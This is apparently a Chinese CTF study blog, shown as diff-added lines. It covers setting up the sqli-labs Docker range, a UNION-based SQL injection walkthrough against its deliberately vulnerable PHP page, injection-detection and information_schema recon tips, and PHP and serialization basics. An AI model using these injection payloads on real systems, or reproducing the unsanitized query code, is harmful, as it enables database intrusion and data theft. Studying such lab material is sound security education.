+<p>​	大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。<br>​     应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。<br>​     例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p>
+<h3 id="二、mysql注入"><a href="#二、mysql注入" class="headerlink" title="二、mysql注入"></a>二、mysql注入</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623825461063-3176cffa-46d5-494a-9149-34dd9d0b44b2.png" alt="img" loading="lazy"></p>
+<h3 id="三、忍者系统安装"><a href="#三、忍者系统安装" class="headerlink" title="三、忍者系统安装"></a>三、忍者系统安装</h3><p>**参考博客：**<a href="https://blog.csdn.net/qq_35258210/article/details/115457883">https://blog.csdn.net/qq_35258210/article/details/115457883</a></p>
+<p>将镜像下载好使用VM安装，我给该系统分配了70个G硬盘，6G内存</p>
+<p>镜像下载链接：链接: <a href="https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg">https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg</a> 密码: a33b</p>
+<p><strong>注意：</strong></p>
+<p>**1、**刚开始安装的时候vm可能无法读取到镜像、在进入的时候按enter键，其余的步骤和上面的博客一致、不在赘述。安装完成后截图,由于忍者系统是基于win10开发的而内存也给的相对比较大在使用的过程中很有可能出现卡顿的情况建议使用vm player打开忍者系统。</p>
+<p>**2、**开始使用的时候忍者系统有两个网卡建议禁用两个让其中的一个通信</p>
+<p>密码：toor</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623812599439-dee380df-7c6a-45d1-a565-ff5feaccab4e.png" alt="img" loading="lazy"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623812729557-3004dfc2-2b82-4fba-98d9-8a83fd215137.png?x-oss-process=image/format,webp" alt="image.png" loading="lazy"></p>
+<h3 id="四、sql注入靶场搭建"><a href="#四、sql注入靶场搭建" class="headerlink" title="四、sql注入靶场搭建"></a>四、sql注入靶场搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@oldjiang ~]# docker pull acgpiano/sqli-labs</span><br><span class="line">[root@oldjiang ~]# docker run -dt --name sqli -p 80:80 -p 13306:3306 --rm acgpiano/sqli-labs</span><br><span class="line">[root@oldjiang ~]# docker exec -it sqli /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>访问<img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623814612177-7b996b60-e876-427d-b11c-2eb8cfbe079f.png" alt="img" loading="lazy"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623816863968-03b39520-736a-4953-9193-393137069010.png" alt="img" loading="lazy"></p>
+<p>查看源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@1f9ac3840241:/# cat /var/www/html/Less-2/index.php</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-2 **Error Based- Intiger**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div style=&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">        if($row)</span><br><span class="line">        &#123;</span><br><span class="line">        echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">        echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">        echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">        echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">        echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">        else</span><br><span class="line">                &#123;</span><br><span class="line">                echo &quot;Please input the ID as parameter with numeric value&quot;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-2.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>**备注：**在上面的代码中可以看到<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>直接传递的变量$id带入sql语句中执行没有做任何的限制，这样为恶意代码插入执行创造了条件。通过修改带入的代码执行的语句最终达到SQL注入获取敏感信息</p>
+<ul>
+<li>在数据库中执行:</li>
+</ul>
+<p>id&#x3D;-1 是为了让回显的结果为空执行后面union的字句。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from emails;</span><br><span class="line">+----+------------------------+</span><br><span class="line">| id | email_id               |</span><br><span class="line">+----+------------------------+</span><br><span class="line">|  1 | Dumb@dhakkan.com       |</span><br><span class="line">|  2 | Angel@iloveu.com       |</span><br><span class="line">|  3 | Dummy@dhakkan.local    |</span><br><span class="line">|  4 | secure@dhakkan.local   |</span><br><span class="line">|  5 | stupid@dhakkan.local   |</span><br><span class="line">|  6 | superman@dhakkan.local |</span><br><span class="line">|  7 | batman@dhakkan.local   |</span><br><span class="line">|  8 | admin@dhakkan.com      |</span><br><span class="line">+----+------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users WHERE id=-1 LIMIT 0,1;			#显示的结果为空、因为没有id=-1的字段</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users WHERE id=-1 union  select 1,email_id,3 from emails LIMIT 0,1;</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">| id | username         | password |</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">|  1 | Dumb@dhakkan.com | 3        |</span><br><span class="line">+----+------------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在网页中执行</li>
+</ul>
+<p>%20在网页的URL编码中为空格，在id&#x3D;-2添加代码：union  select 1,email_id,3 from emails</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623816318576-7d3b351f-af0c-4165-8821-5e1d3c92e6ae.png" alt="img" loading="lazy"></p>
+<p>**总结：**可控变量，带入数据库查询，变量未存在过滤或过滤不严谨。</p>
+<p>测试题:参数x有注入，以下那个注入测试正确?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a. www.xiaodi8.com/news.php?y=1 and 1=1&amp;x=2</span><br><span class="line">b. www.xiaodi8.com/news.php?y=1&amp;x=2 and 1=1</span><br><span class="line">c. www .xiaodi8.com/news.php?y=1 and 1=1&amp;x=2 and 1=1</span><br><span class="line">d. www .xiaodi8.com/news.php?xx=1 and 1=1&amp;xxx=2 and 1=1</span><br></pre></td></tr></table></figure>
+
+<p>判断是否存在注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、逻辑值</span><br><span class="line">    and 1 = 1		页面正常</span><br><span class="line">    and 1 = 2		页面异常</span><br><span class="line">    则可能存在注入点</span><br><span class="line"></span><br><span class="line">2、order by</span><br><span class="line">		通过order by 判断注入的字段数</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>信息收集</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库版本：version()</span><br><span class="line">数据库名字：database()</span><br><span class="line">数据库用户：user()</span><br><span class="line">操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>版本探测的意义</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库</span><br><span class="line">相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取相关信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema.tables			#information_schema下面的所有表名</span><br><span class="line">information_schema.columns		#information_schema下面所有的列名</span><br><span class="line">table_name										#表名</span><br><span class="line">column_name										#列名</span><br><span class="line">table_schema									#数据库名</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h1><p>在指导 Web 方向入门时，我们常说要有一点 PHP 基础，很对新生会对此疑惑 —— 什么程度的基础。 因为 CTF 或者说安全并不是要求你做开发工作，而是审计工作，你不需要完全学习一门语言之后再去处理工作，这没有太大意义。</p>
+<p>本节内容将介绍在 CTF 比赛中涉及的 PHP 基础语法内容，当然因为篇幅原因，不会太过详细，读者需要结合内容自行在做题的基础上扩展。</p>
+<h3 id="PHP-基础格式"><a href="#PHP-基础格式" class="headerlink" title="PHP 基础格式"></a>PHP 基础格式</h3><p>PHP 脚本以 ** 开始，以 <strong>?&gt;</strong> 结束：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //执行的相关PHP代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="变量-赋值-以及-运算¶"><a href="#变量-赋值-以及-运算¶" class="headerlink" title="变量 赋值 以及 运算¶"></a>变量 赋值 以及 运算<a href="https://hello-ctf.com/HC_Web/php_basic/#_1">¶</a></h3><p>PHP 中，变量以 <strong>$</strong> 符号开始，后面跟着变量的名称，并且变量名是区分大小写的（y和<em>y</em>和Y 是两个不同的变量）</p>
+<p>要注意的是 PHP 是一门弱类型语言，我们不必向 PHP 声明该变量的数据类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x_int = 1024;</span><br><span class="line">$y_int = 0xFFF;</span><br><span class="line">$float_num = 1.5;</span><br><span class="line">$txt_string = &quot;Hello CTF!&quot;;</span><br><span class="line">$stat_Boolean = true;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>赋值 以及 复合赋值</strong></p>
+<table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>等同于</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>x &#x3D; y</td>
+<td>x &#x3D; y</td>
+<td>左操作数被设置为右侧表达式的值</td>
+</tr>
+<tr>
+<td>x ?&#x3D; y</td>
+<td>x &#x3D; x ? y</td>
+<td>支持 <code>+=</code>, <code>-=</code>, <code>*=</code>, <code>/=</code>, <code>%=</code>,<code>.=</code></td>
+</tr>
+</tbody></table>
+<p><strong>逻辑运算</strong></p>
+<table>
+<thead>
+<tr>
+<th>运算符</th>
+<th><strong>名称</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>x <code>and</code> &#x2F; <code>&amp;&amp;</code> y</td>
+<td>与</td>
+<td>如果 x 和 y 都为 true，则返回 true</td>
+</tr>
+<tr>
+<td>x <code>or</code> &#x2F; || y</td>
+<td>或</td>
+<td>如果 x 和 y 至少有一个为 true，则返回 true</td>
+</tr>
+<tr>
+<td>x xor y</td>
+<td>异或</td>
+<td>如果 x 和 y 有且仅有一个为 true，则返回 true</td>
+</tr>
+<tr>
+<td>! x</td>
+<td>非</td>
+<td>如果 x 不为 true，则返回 true</td>
+</tr>
+</tbody></table>
+<h3 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h3><ul>
+<li>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</li>
+<li>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 == false: bool(true)</span><br><span class="line">0 === false: bool(false)</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul>
+<li><code>echo</code> - 可以输出一个或多个字符串</li>
+<li><code>print</code> - 只允许输出一个字符串，返回值总为 1</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello CTF 很有趣！&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p><strong><code>array()</code> 函数用于创建数组</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars=array(&quot;Hello&quot;,&quot;CTF&quot;);</span><br><span class="line">echo &quot;I like &quot; . $cars[0] . &quot; &quot; . $cars[1] . &quot;.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 <code>[]</code> 定义数组</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$z = [&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;];</span><br><span class="line">$z[0] = &#x27;H&#x27;;</span><br><span class="line">$z[1] = &#x27;r&#x27;;</span><br><span class="line">$z[2] = &#x27;l&#x27;;</span><br><span class="line">$z[3] = &#x27;l&#x27;;</span><br><span class="line">$z[4] = &#x27;o&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>行如 **<code>__FILE__</code> ** 这样的 <code>__XXX__</code> 预定义常量，被称为魔术常量。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__FILE__ //返回文件的完整路径和文件名</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); //代码高亮的显示当前文件内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><p><strong>文件操作函数</strong>：</p>
+<ul>
+<li><code>include()</code>: 导入并执行指定的 PHP 文件。例如：<code>include(&#39;config.php&#39;);</code> 会导入并执行 <code>config.php</code> 文件中的代码。</li>
+<li><code>require()</code>: 类似于 <code>include()</code>，但如果文件不存在，则会产生致命错误。</li>
+<li><code>include_once()</code>, <code>require_once()</code>: 与 <code>include</code> 和 <code>require</code> 类似，但只导入文件一次。</li>
+<li><code>fopen()</code>: 打开一个文件或 URL。例如：<code>$file = fopen(&quot;test.txt&quot;, &quot;r&quot;);</code> 会以只读模式打开 <code>test.txt</code>。</li>
+<li><code>file_get_contents()</code>: 读取文件的全部内容到一个字符串。例如：<code>$content = file_get_contents(&quot;test.txt&quot;);</code></li>
+<li><code>file_put_contents()</code>: 将一个字符串写入文件。例如：<code>file_put_contents(&quot;test.txt&quot;, &quot;Hello World!&quot;);</code></li>
+</ul>
+<p><strong>代码执行函数</strong>：</p>
+<ul>
+<li><code>eval()</code>: 执行字符串中的 PHP 代码。例如：<code>eval(&#39;$x = 5;&#39;);</code> 会设置变量 <code>$x</code> 的值为 5。</li>
+<li><code>assert()</code>: 用于调试，检查一个条件是否为 true。</li>
+<li><code>system()</code>, <code>shell_exec()</code>, <code>exec()</code>, <code>passthru()</code>: 执行外部程序或系统命令。例如：<code>system(&quot;ls&quot;);</code> 会执行 <code>ls</code> 命令并显示输出。</li>
+</ul>
+<p><strong>反序列化函数</strong>：</p>
+<ul>
+<li><code>unserialize()</code>: 将一个已序列化的字符串转换回 PHP 的值。例如：<code>$array = unserialize($serializedStr);</code> 可以将一个序列化的数组字符串转换为数组。</li>
+</ul>
+<p><strong>数据库操作函数</strong>：</p>
+<ul>
+<li><code>mysql_query()</code>, <code>mysqli_query()</code>: 发送一个 MySQL 查询。例如：<code>$result = mysql_query(&quot;SELECT * FROM users&quot;);</code></li>
+</ul>
+<p><strong>其他函数</strong>：</p>
+<ul>
+<li><code>preg_replace()</code>: 执行正则表达式搜索和替换。例如：<code>$newStr = preg_replace(&quot;/apple/i&quot;, &quot;orange&quot;, $str);</code> 会将 <code>$str</code> 中的 “apple” 替换为 “orange”。</li>
+<li><code>create_function()</code>: 创建匿名的 lambda 函数。例如：<code>$func = create_function(&#39;$x&#39;, &#39;return $x + 1;&#39;);</code></li>
+</ul>
+<h1 id="PHP-序列化及反序列化基础"><a href="#PHP-序列化及反序列化基础" class="headerlink" title="PHP 序列化及反序列化基础"></a>PHP 序列化及反序列化基础</h1><p>标题有说道，这两种数据处理方式， 序列化 和 反序列化。</p>
+<ul>
+<li><strong>序列化</strong> 是将 PHP 对象转换为字符串的过程，可以使用 <code>serialize()</code> 函数来实现。该函数将对象的状态以及它的类名和属性值编码为一个字符串。序列化后的字符串可以存储在文件中，存储在数据库中，或者通过网络传输到其他地方。</li>
+<li><strong>反序列化</strong> 是将序列化后的字符串转换回 PHP 对象的过程，可以使用 <code>unserialize()</code> 函数来实现。该函数会将序列化的字符串解码，并将其转换回原始的 PHP 对象。</li>
+<li>序列化的目的是方便数据的存储，在 PHP 中，他们常被用到缓存、session、cookie 等地方。</li>
+</ul>
+<p>下面我们从数组的反序列化开始 一步一步讲解。</p>
+<h3 id="数组的反序列化¶"><a href="#数组的反序列化¶" class="headerlink" title="数组的反序列化¶"></a>数组的反序列化<a href="https://hello-ctf.com/HC_Web/php_unser_base/#_2">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = array(&quot;tan&quot;,&quot;ji&quot;);</span><br><span class="line"></span><br><span class="line">$username = serialize($username);</span><br><span class="line"></span><br><span class="line">echo ($username. &quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">print_r(unserialize($username));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($username));</span><br></pre></td></tr></table></figure>
+
+<p>上面对数组的反序列化会输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125; ----- echo ($username. &quot;\n&quot;);</span><br><span class="line">Array  -------------------------------- print_r(unserialize($username));</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; tan</span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">array(2) &#123; ---------------------------- var_dump(unserialize($username));</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;tan&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ji&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面反序列化中的字符中，每个部分代表不同的属性：</p>
+<p><img src="https://hello-ctf.com/HC_Web/assets/202305112137177.png" alt="image-20230511213751065" loading="lazy"></p>
+<p>以此类推 ww</p>
+<h3 id="普通对象的反序列化¶"><a href="#普通对象的反序列化¶" class="headerlink" title="普通对象的反序列化¶"></a><strong>普通对象的反序列化</strong><a href="https://hello-ctf.com/HC_Web/php_unser_base/#_3">¶</a></h3><p>我们先看一个简单的对象示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">public $name;</span><br><span class="line"></span><br><span class="line">public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该对象允许使用下面的语法创建：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user = new User(&quot;Probius_Official&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>下面我们对其进行序列化，并且输出出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$serializedData = serialize($user);</span><br><span class="line">echo $serializedData . &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>可以得到下面的输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:16:&quot;Probius_Official&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hello-ctf.com/HC_Web/assets/202305112206154.png" alt="image-20230511220616100" loading="lazy"></p>
+<p>此时我们如果采用数组为姓名变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user = new User(array(&quot;Probius&quot;,&quot;Official&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>则再次运行，输出就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:7:&quot;Probius&quot;;i:1;s:8:&quot;Official&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hello-ctf.com/HC_Web/assets/202305112219150.png" alt="image-20230511221906077" loading="lazy"></p>
+<p>其实拆分开来没那么难理解。</p>
+<p>然后我们针对上面的代码，添加点类中的其他属性，如：<code>保护变量</code> <code>私有变量</code> <code>自定义函数</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    protected $email;</span><br><span class="line">    private $phoneNumber;</span><br><span class="line">    public function __construct($name, $email,$phoneNumber) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;email = $email;</span><br><span class="line">        $this -&gt;phoneNumber = $phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">    public function getPhoneNumber()&#123;</span><br><span class="line">        echo $this -&gt;phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User(array(&quot;tan&quot;,&quot;ji&quot;), &#x27;admin@probius.xyz&#x27;,&#x27;19191145148&#x27;);</span><br><span class="line"></span><br><span class="line">$serializedData = serialize($user);</span><br><span class="line">echo $serializedData . &quot;\n&quot;;</span><br><span class="line">$deserializedUser = unserialize($serializedData);</span><br><span class="line">print_r($deserializedUser -&gt; name);</span><br><span class="line">echo $deserializedUser -&gt; getPhoneNumber();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其输出为：</p>
+<p><strong>Serialized Data</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125;s:8:&quot; * email&quot;;s:17:&quot;admin@probius.xyz&quot;;s:17:&quot; User phoneNumber&quot;;s:11:&quot;19191145148&quot;;&#125;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; tan</span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">19191145148</span><br></pre></td></tr></table></figure>
+
+<p>为了方便理解，我们这样拆分一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125;---- public $name;</span><br><span class="line"></span><br><span class="line">s:8:&quot; * email&quot;;s:17:&quot;admin@probius.xyz&quot;;---------------------- protected $email;</span><br><span class="line"></span><br><span class="line">s:17:&quot; User phoneNumber&quot;;s:11:&quot;19191145148&quot;;&#125;----------------- private $phoneNumber;</span><br></pre></td></tr></table></figure>
+
+<p>观察不同类型变量名的字符长度标识，你会发现长度和你看到的好像有些不一样，那是因为在 <code>protected</code> 和 <code>private</code> 类型的变量中都加入了不可见字符：</p>
+<p>如果是 <code>protected</code> 变量，则会在变量名前加上<code>\x00*\x00</code></p>
+<p>如果是 <code>private</code> 变量，则会在变量名前加上<code>\x00类名</code></p>
+<p>或许下面控制台的输出比起上面不可见字符变成了类似”&#96;&#96;”空格的字符更直观（虽然也直观不到哪里去。</p>
+<p><img src="https://hello-ctf.com/HC_Web/assets/202305112239183.png" alt="image-20230511223914122" loading="lazy"></p>
+<p>所以一般我们在输出的时候都会先编码后输出，以免遇到保护和私有类序列化后不可见字符丢失的问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125;---------- public $name;</span><br><span class="line"></span><br><span class="line">s:8:&quot;\x00*\x00email&quot;;s:17:&quot;admin@probius.xyz&quot;;---------------------- protected $email;</span><br><span class="line"></span><br><span class="line">s:17:&quot;\x00User\x00phoneNumber&quot;;s:11:&quot;19191145148&quot;;&#125;----------------- private $phoneNumber;</span><br></pre></td></tr></table></figure>
+
+<p><code>echo urlencode($serializedData)</code> :</p>
+<table>
+<thead>
+<tr>
+<th><code>1 2 3 4 5</code></th>
+<th><code>O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22tan%22%3Bi%3A1%3Bs%3A2%3A%22ji%22%3B%7D-------------------------------------------------------------- public $name;  s%3A8%3A%22%00%2A%00email%22%3Bs%3A17%3A%22admin%40probius.xyz%22%3B------- protected $email;  s%3A17%3A%22%00User%00phoneNumber%22%3Bs%3A11%3A%2219191145148%22%3B%7D---- private $phoneNumber;</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="自定义类的反序列化¶"><a href="#自定义类的反序列化¶" class="headerlink" title="自定义类的反序列化¶"></a><strong>自定义类的反序列化</strong><a href="https://hello-ctf.com/HC_Web/php_unser_base/#_4">¶</a></h3><p>如果我们把上面的类改成这样：</p>
